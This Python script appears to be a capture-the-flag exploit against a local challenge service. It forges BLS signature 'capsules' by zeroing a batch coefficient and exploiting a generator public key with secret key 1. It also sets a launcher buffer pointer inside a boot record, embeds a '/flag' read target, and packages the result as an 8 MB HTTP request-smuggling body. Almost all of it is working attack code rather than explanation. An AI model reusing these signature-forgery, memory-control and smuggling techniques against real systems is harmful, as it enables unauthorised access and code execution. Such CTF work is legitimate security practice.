#!/usr/bin/env python3
import sys,struct,json,urllib.request,os
from forge_hash import solve_zero_meta,fmeta,rol,core,ADMIN_DOMAIN,DELEGATE_DOMAIN,FR
from py_ecc.optimized_bls12_381 import G1,neg,multiply
from py_ecc.bls.point_compression import compress_G1
url=sys.argv[1] if len(sys.argv)>1 else 'http://127.0.0.1:1337'
try: oracle=json.load(open(os.environ.get('ORACLE_VALUES','oracle_values.json')))
except FileNotFoundError: oracle={'f0':0x297e9a,'f2':0x6de07d,'f3':0x718834,'rootcommit':0x802c622380a3e256,'field2e':0x475263020fc2bfd4}
st=json.load(urllib.request.urlopen(url+'/9f3c7a12'));nonce=int(st['n'],16);epoch=st['e']
root=int(st['r'],16)
boot=int(st['b'],16)
meta=solve_zero_meta(nonce,epoch)
w=fmeta(meta,nonce,epoch)
w2=fmeta(meta^0x2d314f19a72b,rol(nonce,19),epoch^0x4539a1)
if not w2:
    w2=1
# Make the admin batch coefficient zero.  The second public key is the G2
# generator (secret key 1), so its signature is just its hash point.
count=5
payload=bytearray(0x6b8+4*count)
struct.pack_into('<I',payload,0,0xe2194da6)
payload[4:8]=bytes([1,1,3,count])
struct.pack_into('<I',payload,8,len(payload))
# Encode the 256-element code/descriptor vectors (23-bit little endian).
def pack_vec(off,path):
    raw=open(path,'rb').read()
    assert len(raw)==0x400
    vals=struct.unpack('<256I',raw)
    assert all(v < 0x800000 for v in vals)
    for i,v in enumerate(vals): payload[off+3*i:off+3*i+3]=v.to_bytes(3,'little')
pack_vec(0x38,os.environ.get('PROOF_A','proof_A.bin'))
pack_vec(0x338,os.environ.get('PROOF_B','proof_B.bin'))
# This packed 23-bit header field must name the immediately previous epoch.
prev=(epoch-1)&0x7fffff
payload[0x18:0x1b]=prev.to_bytes(3,'little')
# The snapshot binds both the public legacy root and boot word.
payload[0x0c:0xf]=(oracle['f0']).to_bytes(3,'little')
payload[0x0f:0x12]=(oracle['f0']).to_bytes(3,'little')
payload[0x12:0x15]=(oracle['f2']).to_bytes(3,'little')
payload[0x15:0x18]=(oracle['f3']).to_bytes(3,'little')
struct.pack_into('<Q',payload,0x1b,oracle['rootcommit'])
struct.pack_into('<Q',payload,0x23,boot)
# This word is copied into the class-5 boot record and becomes the launcher's
# capability-transfer buffer pointer (ctx[13]).  It must land in the scratch
# window accepted by the launcher.
payload[0x2b:0x2e]=(0xb0080).to_bytes(3,'little')
# local dynamic extraction: generator commitment
struct.pack_into('<Q',payload,0x2e,oracle['field2e'])
record_text=os.environ.get('RECORD_TEXT','/flag').encode()
record_vals=[int(x,0) for x in os.environ['RECORD_VALUES'].split(',')] if 'RECORD_VALUES' in os.environ else list(record_text)
assert len(record_vals)==5 and all(0 <= x < 0x800000 for x in record_vals)
for i,v in enumerate(record_vals):
    payload[0x638+4*i] = 0x20+i
    payload[0x639+4*i:0x63c+4*i] = v.to_bytes(3,'little')
trailer_off=0x638+4*count
payload[trailer_off:trailer_off+128]=open(os.environ.get('PROOF_TRAILER','proof_trailer.bin'),'rb').read()
payload=bytes(payload)
raw1=core(0x41444d494e555044,ADMIN_DOMAIN+struct.pack('<QI',nonce,epoch))
h1=int.from_bytes(raw1,'little')%FR or 1
raw2=core(0x44454c4547415445,DELEGATE_DOMAIN+struct.pack('<QII',nonce,epoch,len(payload))+payload)
h2=int.from_bytes(raw2,'little')%FR or 1
print(st,'meta',hex(meta),'weights',hex(w),hex(w2),'hash scalars',hex(h1),hex(h2),'payload',len(payload))
def comp(P):return int(compress_G1(P)).to_bytes(48,'big')
sig1=comp(G1);sig2=comp(multiply(G1,h2))
header=struct.pack('<IBBH',0xf38c21d7,1,0,0x70+len(payload))
header+=struct.pack('<H',meta&0xffff)+bytes([(meta>>16)&0x7f])+struct.pack('<H',(meta>>23)&0xffff)+bytes([(meta>>39)&0x7f])+struct.pack('<H',len(payload))
capsule=header+sig1+sig2+payload
assert len(capsule)==0x70+len(payload)
# prefix upload
prefix=open(sys.argv[2] if len(sys.argv)>2 else 'resource_seed','rb').read()
N=0
for _ in range(10):
 h=(f'PUT /r/6d91 I/1\r\nContent-Length: {N}\r\nX-6d91: {epoch}\r\n').encode();N2=0x800000-len(h)-2
 if N2==N:break
 N=N2
h=(f'PUT /r/6d91 I/1\r\nContent-Length: {N}\r\nX-6d91: {epoch}\r\n').encode()
inner=capsule+b'\0'*(N-len(capsule));body=prefix+h+b'\r\n'+inner
assert len(body)==len(prefix)+0x800000
open('forged_smuggle.bin','wb').write(body)
print('capsule',len(capsule),'body',len(body),'points',sig1.hex(),sig2.hex())
